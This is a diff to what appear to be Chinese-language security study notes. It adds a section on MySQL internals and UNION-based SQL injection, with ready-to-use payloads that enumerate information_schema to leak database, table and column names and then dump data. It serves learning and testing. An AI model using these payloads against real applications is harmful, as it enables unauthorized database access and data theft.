@@ -51,6 +51,23 @@
     * 用%26取代
   * = => LIKE
   * LIMIT 0,1 => LIMIT 1 OFFSET 0
+* `@@version` : 同`version()`，回傳資料庫版本
+* `user()` : 回傳使用者名稱
+* `information_schema`
+  * SQL內建的資料庫，會儲存資料庫內部的資訊，例如所有table/column name
+  * 透過leak information_schema取得想要的資料庫
+  * databasename is at `information_schema.schemata`
+  * tablename is at `information_schema.tables`
+  * columnname is at `information_schema.columns`
+  * leak database name
+    * `'union select schema_name,1 from information_schema.schemata #`
+    * can add `limit` to find certain information
+  * leak table name
+    * `'union select table_name,1 from information_schema.tables where table_schema like '$databasename'#`
+  * leak column name
+    * `'union select column_name,1 from information_schema.columns where table_name like '$tablename'#`
+  * With the 3 information above found, leak the information
+    * `'union select $columnname,1 from $databasename.$tablename#` 
 
 
 ## XSS Injection
